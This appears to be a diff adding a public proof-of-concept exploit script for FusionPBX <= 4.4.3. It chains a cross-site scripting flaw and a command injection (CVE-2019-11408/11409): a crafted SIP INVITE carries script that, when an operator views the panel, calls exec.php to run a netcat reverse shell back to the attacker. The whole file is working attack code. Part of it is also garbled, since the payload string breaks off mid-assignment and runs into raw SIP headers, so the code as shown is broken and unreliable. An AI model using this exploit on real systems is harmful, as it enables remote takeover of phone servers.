@@ -1,0 +1,85 @@
+# Exploit Title: FusionPBX <= 4.4.3 Command Injection RCE via XSS 
+# Date: 06-11-2019
+# Exploit Author: Dustin Cobb
+# Vendor Homepage: https://www.fusionpbx.com
+# Software Link: https://https://github.com/fusionpbx/fusionpbx
+# Version: <= 4.4.3
+# Tested on: Debian 8.11
+# CVE : CVE-2019-11408 (XSS) AND CVE-2019-11409 (Command Injection RCE)
+
+#!/usr/bin/python
+import socket, sys
+from random import randint
+from hashlib import md5
+
+# Exploitation steps:
+#
+# 1. First, encode an XSS payload that will be injected into the
+#    “Caller ID Number” field, or “User” component of the SIP 
+#    “From” URI.
+# 2. Connect to external SIP profile port and send a SIP INVITE 
+#    packet with XSS payload injected into the From Field.
+# 3. XSS payload will fire operator panel screen (CVE-2019-11408), which 
+#    is designed to be monitored constantly by a call center operator.
+# 4. Once XSS code executes, a call is made to the exec.php script 
+#    (CVE-2019-11409) with a reverse shell payload that connects back to 
+#    a netcat listener on the attacker system.  
+
+
+# edit these variables to set up attack
+victim_addr="10.10.10.10"
+victim_host="victim-pbx1.example.com"
+victim_num="12125551212"
+
+attacker_ip="10.10.10.20"
+attacker_port=4444
+
+def encode(val):
+    ret=""
+
+    for c in val:
+        ret+="\\x%02x" % ord(c)
+
+    return ret
+
+callid=md5(str(randint(0,99999999))).hexdigest()
+
+cmd="nc -e /bin/bash %s %d" % (attacker_ip, attacker_port)
+payload="q=new XMLHttpRequest();q.open('GET','exec.php?cmd=system %s',true);q.send();" % cmd
+
+xss=";tag=%s
+To: 
+Call-ID: %s
+CSeq: 1 INVITE
+Contact: 
+Max-Forwards: 70
+User-Agent: Exploit POC
+Content-Type: application/sdp
+Allow: INVITE, ACK, OPTIONS, CANCEL, BYE, SUBSCRIBE, NOTIFY, INFO, REFER, UPDATE, MESSAGE
+Content-Length: 209
+
+v=0
+o=root 1204310316 1204310316 IN IP4 127.0.0.1
+s=Media Gateway
+c=IN IP4 127.0.0.1
+t=0 0
+m=audio 4446 RTP/AVP 0 101
+a=rtpmap:0 PCMU/8000
+a=rtpmap:101 telephone-event/8000
+a=fmtp:101 0-16
+a=ptime:2
+a=sendrecv""" % (victim_num, victim_host, xss, callid, victim_num, victim_host, callid)
+
+payload=payload.replace("\n","\r\n")
+
+s=socket.socket()
+
+s.connect((victim_addr,5080))
+
+print payload
+print
+
+s.send(payload)
+data=s.recv(8192)
+
+print data
